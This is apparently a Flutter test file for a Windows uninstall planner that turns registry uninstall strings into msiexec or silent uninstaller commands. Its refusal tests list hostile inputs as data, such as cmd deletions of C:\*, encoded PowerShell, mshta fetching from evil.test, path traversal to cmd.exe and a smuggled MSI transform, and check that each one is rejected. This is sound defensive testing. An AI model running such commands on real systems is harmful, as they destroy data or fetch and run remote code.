import 'package:flutter_test/flutter_test.dart';
import 'package:script_utility/features/apps/application/uninstall_command.dart';
import 'package:script_utility/features/apps/domain/app_package.dart';

const _env = <String, String>{
  'SystemRoot': r'C:\Windows',
  'ProgramFiles': r'C:\Program Files',
  'ProgramFiles(x86)': r'C:\Program Files (x86)',
  'ComSpec': r'C:\Windows\system32\cmd.exe',
  'PS': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
};
const _msiexec = r'C:\Windows\System32\msiexec.exe';

UninstallEntry _entry({
  String? uninstall,
  String? quiet,
  String? msi,
  String key = 'App',
}) => UninstallEntry(
  hive: 'HKLM',
  view: '64',
  key: key,
  uninstallString: uninstall,
  quietUninstallString: quiet,
  msiProductCode: msi,
);

UninstallPlan _plan(UninstallEntry entry, {Set<String>? missing}) =>
    planUninstall(
      entry,
      environment: _env,
      fileExists: (path) => !(missing ?? const {}).contains(path),
    );

UninstallCommand _command(UninstallEntry entry) =>
    (_plan(entry) as UninstallCommand);

void main() {
  group('MSI', () {
    test('product code gives a silent msiexec /x by full path', () {
      final command = _command(
        _entry(msi: '{26A24AE4-039D-4CA4-87B4-2F64180101F0}'),
      );
      expect(command.executable, _msiexec);
      expect(command.arguments, [
        '/x',
        '{26A24AE4-039D-4CA4-87B4-2F64180101F0}',
        '/qn',
        '/norestart',
      ]);
      expect(command.silent, isTrue);
    });

    test('MsiExec in the uninstall string keeps only a valid GUID', () {
      final command = _command(
        _entry(
          uninstall:
              'MsiExec.exe /I{11111111-2222-3333-4444-555555555555} TRANSFORMS=evil.mst',
        ),
      );
      expect(command.executable, _msiexec);
      expect(command.arguments, [
        '/x',
        '{11111111-2222-3333-4444-555555555555}',
        '/qn',
        '/norestart',
      ]);
    });

    test('msiexec without a GUID is manual', () {
      expect(
        _plan(_entry(uninstall: r'msiexec.exe /x C:\temp\pkg.msi')),
        isA<UninstallManual>(),
      );
    });
  });

  group('splitting', () {
    test('quoted path with spaces, then arguments', () {
      final command = _command(
        _entry(
          uninstall:
              r'"C:\Program Files\Foo Bar\uninstall.exe" /mode "full clean"',
          key: 'Foo',
        ),
      );
      expect(command.executable, r'C:\Program Files\Foo Bar\uninstall.exe');
      expect(command.arguments, ['/mode', 'full clean', '/S']);
    });

    test('unquoted path with spaces ends at .exe', () {
      final command = _command(
        _entry(uninstall: r'C:\Program Files (x86)\Old App\setup.exe -remove'),
      );
      expect(command.executable, r'C:\Program Files (x86)\Old App\setup.exe');
      expect(command.arguments, ['-remove']);
      expect(command.silent, isFalse, reason: 'unknown installer: windowed');
    });

    test('backslashes before quotes follow CommandLineToArgvW', () {
      final split = splitCommandLine(
        r'"C:\Tool\u.exe" /dir="C:\Some Dir\\" /q \"x\" a\\b',
      );
      expect(split!.$2, [r'/dir=C:\Some Dir\', '/q', '"x"', r'a\\b']);
    });

    test('environment variables in the path are expanded', () {
      final command = _command(
        _entry(uninstall: r'"%ProgramFiles%\Tool\uninst.exe"'),
      );
      expect(command.executable, r'C:\Program Files\Tool\uninst.exe');
    });
  });

  group('silent switches', () {
    test('QuietUninstallString wins over the normal one', () {
      final command = _command(
        _entry(
          uninstall: r'"C:\Program Files\A\a.exe"',
          quiet: r'"C:\Program Files\A\a.exe" --silent',
        ),
      );
      expect(command.arguments, ['--silent']);
      expect(command.silent, isTrue);
    });

    test('Inno Setup gets VERYSILENT', () {
      final command = _command(
        _entry(uninstall: r'"C:\Program Files\Git\unins000.exe"'),
      );
      expect(command.arguments, [
        '/VERYSILENT',
        '/SUPPRESSMSGBOXES',
        '/NORESTART',
      ]);
      expect(command.silent, isTrue);
    });

    test('NSIS-style uninstaller gets /S once', () {
      expect(
        _command(
          _entry(uninstall: r'"C:\Program Files\B\Uninstall.exe" /S'),
        ).arguments,
        ['/S'],
      );
    });

    test('windowed fallback when silent is not wanted', () {
      final command =
          planUninstall(
                _entry(uninstall: r'"C:\Program Files\Git\unins000.exe"'),
                environment: _env,
                fileExists: (_) => true,
                preferSilent: false,
              )
              as UninstallCommand;
      expect(command.arguments, isEmpty);
      expect(command.silent, isFalse);
    });
  });

  group('refused: shown as a manual step, never run', () {
    for (final value in [
      r'cmd /c "C:\Program Files\X\u.exe"',
      r'"%ComSpec%" /c del C:\x',
      r'%ComSpec% /c del C:\x',
      r'"%PS%" -c x',
      r'C:\Windows\System32\cmd.exe /c del C:\*',
      r'powershell -enc AAAA',
      r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -File x.ps1',
      r'rundll32.exe C:\PROGRA~1\X\x.dll,Uninstall',
      r'mshta http://evil.test/x.hta',
      r'wscript C:\x.vbs',
      r'\\server\share\uninstall.exe',
      r'uninstall.exe',
      r'C:\Program Files\X\..\..\Windows\System32\cmd.exe',
      r'"C:\Program Files\X\remove.bat"',
      r'%UNKNOWN%\x.exe',
      '',
    ]) {
      test(value.isEmpty ? '(empty)' : value, () {
        expect(_plan(_entry(uninstall: value)), isA<UninstallManual>());
      });
    }

    test('missing executable', () {
      expect(
        _plan(
          _entry(uninstall: r'"C:\Program Files\Gone\u.exe"'),
          missing: {r'C:\Program Files\Gone\u.exe'},
        ),
        isA<UninstallManual>(),
      );
    });

    test('no uninstall information at all', () {
      expect(_plan(_entry()), isA<UninstallManual>());
    });
  });
}
